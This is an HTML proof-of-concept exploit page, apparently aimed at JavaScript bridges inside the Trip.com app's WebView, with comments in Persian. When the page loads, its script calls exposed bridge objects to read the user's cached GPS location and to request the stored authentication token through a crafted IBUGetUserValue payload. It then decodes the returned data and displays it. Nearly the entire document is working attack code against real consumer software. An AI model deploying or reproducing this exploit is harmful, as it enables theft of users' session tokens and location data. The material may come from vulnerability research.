<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trip.com Stable PoC</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; }
        .card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
        #logs { font-size: 12px; height: 200px; overflow-y: scroll; border: 1px solid #333; padding: 5px; }
        .crit { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Target Bridges</h3>
        <ul id="bridgeStatus">Checking known bridges...</ul>
    </div>
    <div class="card">
        <h3>Extraction Log</h3>
        <div id="logs">> System Ready.</div>
    </div>
    <button onclick="runExploit()" style="width:100%; padding:10px; background:#222; color:#0f0; border:1px solid #0f0;">Manual Run</button>

    <script>
        function log(msg, isCrit = false) {
            const box = document.getElementById('logs');
            const color = isCrit ? "red" : "#0f0";
            box.innerHTML += `\n> <span style="color:${color}">${msg}</span>`;
            box.scrollTop = box.scrollHeight;
        }

        // شنود خروجی دیتابیس طبق کلاس ax0.b
        window.__bridge_callback = function(base64Data) {
            try {
                const decoded = atob(base64Data); // رمزگشایی طبق متد b
                log("DB DATA RECEIVED: " + decoded, true);
                alert("CRITICAL DATA: " + decoded);
            } catch(e) { log("Decode Error: " + e.message, true); }
        };

        function runExploit() {
            log("Initiating targeted extraction...");

            // ۱. سرقت لوکیشن (تایید شده در کدهای ارسالی)
            if (window.Locate_a && window.Locate_a.getCachedLocationData) {
                try {
                    const loc = window.Locate_a.getCachedLocationData();
                    if (loc) log(`GPS LEAK: Lat ${loc.lat}, Lng ${loc.lng}`, true);
                } catch(e) { log("Location error: " + e.message); }
            }

            // ۲. استخراج توکن (تایید شده در کدهای ارسالی)
            if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
                log("Requesting token from nh.a database...");
                // ساختار دقیق برای H5URLCommand
                const payload = JSON.stringify({
                    "action": "IBUGetUserValue",
                    "arguments": {
                        "bussiness": "common", // توجه به املای bussiness طبق سورس کد
                        "key": "token"
                    },
                    "callback": "__bridge_callback"
                });
                window.IBUStorageV2_a.IBUGetUserValue(payload);
            }
        }

        // بررسی سریع پل‌های هدف بدون هنگ کردن
        setTimeout(() => {
            const targets = ["IBUStorageV2_a", "Storage_a", "Locate_a", "Photo_a"];
            const statusBox = document.getElementById('bridgeStatus');
            statusBox.innerHTML = "";
            targets.forEach(t => {
                const found = typeof window[t] !== 'undefined';
                statusBox.innerHTML += `<li>${t}: ${found ? "READY" : "MISSING"}</li>`;
            });
            runExploit();
        }, 1000);
    </script>
</body>
</html>
